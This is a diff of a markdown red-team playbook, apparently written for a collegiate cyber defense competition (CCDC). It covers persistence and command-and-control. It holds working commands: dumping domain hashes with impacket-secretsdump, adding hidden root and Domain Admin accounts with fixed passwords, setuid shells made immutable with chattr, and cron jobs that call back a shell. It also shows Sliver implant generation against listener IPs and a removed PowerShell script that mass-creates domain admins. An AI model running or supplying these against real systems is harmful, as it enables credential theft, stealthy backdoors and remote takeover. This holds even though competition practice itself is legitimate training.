@@ -18,35 +18,26 @@ pagetitle: Red Teaming for CCDC
       - e.g. `impacket-secretsdump -just-dc -no-pass 'corp.local/TEST-DC$@10.10.0.162'` (DC name is TEST-DC)
 
 - **Persistence:**
-  - Linux:
+  - **Domain:**
+    - Run `mass_user_add_local.sh` with domain admin creds/hash against a DC to add a bunch of domain admins
+      - Pass is `IWinAgain123#`
+    - Grab `krbtgt` (and other) hashes with `impacket-secretsdump 
+  - **Windows:**
+    - When installing the exes, make sure to use `-o` with `iwr` or we'll just get the HTTP connection info lmfao
+    - First, run `windows_add_payloads.ps1` to add the file to each of the locations
+    - Then, run `windows_persistence.ps1`
+  - **Linux:**
     - Add SSH keys
       - `mkdir /root/.ssh` and add key to `/root/.ssh/authorized_keys`
     - Modify `/etc/passwd` and `/etc/ssh/sshd_config`
       - `echo 'wwwdata:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd && chattr +i /etc/passwd && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && chattr +i /etc/ssh/sshd_config`
     - Use setuid binaries in weird locations (like a fake .kernel file):
       - `cp /bin/zsh /.kernel && chmod +sss /.kernel && touch -d "4 May 2024" /.kernel && chattr +i /.kernel`
-      - `chattr` makes the file immutable (even as ROOT????)
-        - We could also use this to add permanent persistence to /etc/passwd or /etc/shadow :o
+      - `chattr` makes the file immutable (and gives ROOT a generic access denied error???)
     - Cron jobs:
       - Make innocuous cron jobs that are just shells sending out continuous connections
       - Upload shell to `/etc/cron.hourly/locate`, `touch -d "12 Jul 2024" /etc/cron.hourly/locate` to make it non-sus, and `chattr +i /etc/cron.hourly/locate`
         - Has to start with a `#!/bin/bash`
-  - Windows:
-    - When installing the exes, make sure to use `-o` with `iwr` or we'll just get the HTTP connection info lmfao
-    - Scheduled tasks: `persistence install --method schtask --name "WindowsUpdate" --interval 600 --hidden`
-    - Registry (run on login?): `persistence install --method registry --name svchost`
-    - WMI: `persistence install --method wmi --name "WindowsWMIUpdate"`
-    - Services: `sc create MySvc binPath= "C:\Path\to\implant.exe" start= auto`
-    - Startup:
-      - Add script to `C:\Windows\System32\GroupPolicy\User\Scripts\Logon\`
-      - Runs on user login: `$path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil.lnk"`
-    - Backdooring domain:
-      - `./mass_user_add_local.sh`
-        - This adds a bunch of users to the domain
-    - MSSQL server:
-      - Theoretically, we could set up an additional MSSQL server in order
-- Web apps:
-  - Get in, change passwords, modify something about the web app or use it for access
 
 **AutoRecon**
 - Command to run at the start of competition: `sudo autorecon {IP_range} -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,636,873,993,995,1025-1030,1080,1433,1521,1723,3306,3389,5432,5900,5985,6379,6667,8000,8080,8443,8888 -o autorecon_results --max-scans 100 --heartbeat 30`
@@ -64,11 +55,12 @@ pagetitle: Red Teaming for CCDC
   - Start up tmux and run `sliver-server`
   - On the server: `new-operator --name malfuncti0nal --lhost localhost` and `multiplayer` to enable clients
   - On the client, outside of tmux: `sliver-client import {config_file}` and `sliver-client` to join
-- `mtls` can be used to start listening for incoming sessions
+- `wg` can be used to start listening for incoming sessions on a sneaky wireguard udp (use mtls otherwise if we dont get a callback)
+  - Seems it doesn't mix well with Windows, unfortunately. Plan on mtls for windows, wg for linux.
 - Then, use `generate` to create implants or beacons
-  - `generate --mtls {our_IP} --os linux` for an implant
-  - `generate beacon --mtls 10.10.0.171 -j {jitter} -S {wait_seconds} --os linux` 
-  - Windows: `generate --mtls 10.10.0.171 --os windows --arch x64 --format exe ` 
+  - `generate --wg {our_IP} --os linux` for an implant
+  - `generate beacon --wg 10.10.0.171 -j {jitter} -S {wait_seconds} --os linux` 
+  - Windows: `generate --mtls 10.10.0.171 --os windows` 
 - `sessions` to show active sessions
   - `sessions -i {id}` to interact with session
     - `CTRL + d` to exit
@@ -146,29 +138,10 @@ pagetitle: Red Teaming for CCDC
   - GPO management > right-click domain > Create GPO in domain and link here > Right click on new GPO + edit > User Configuration\Policies\Administrative Templates\Desktop\Desktop > desktop wallpaper > select `enabled` + enter path of image and select fill for style > apply + ok > `gpupdate /force`
 
 **Todo:**
-- Practice using sliver for session management
-- Make windows persistence script? If we can get sliver working, this should be taken care of
-- 
+- Improve domain persistence (not just adding a bunch of users and grabbing krbtgt)
 
-**Ideas:**
-
-```
-Import-Module ActiveDirectory
-$N = 50
-$outputFile = ".\created_users.txt"
-"" > $outputFile  
-
-for ($i = 1; $i -le $N; $i++) {
-    $username = -join ((65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
-    $password = "Kh43lWuzH3r3"
-    $securePass = ConvertTo-SecureString $password -AsPlainText -Force
-
-    New-ADUser -Name $username -SamAccountName $username -AccountPassword $securePass -Enabled $true
-    Add-ADGroupMember -Identity "Domain Admins" -Members $username
-
-    "$username : $password" | Out-File -Append $outputFile
-}
-```
+**Unimplemented Ideas:**
+- None rn
 
 **Defender/AppArmor/SELinux**
 - Defender:
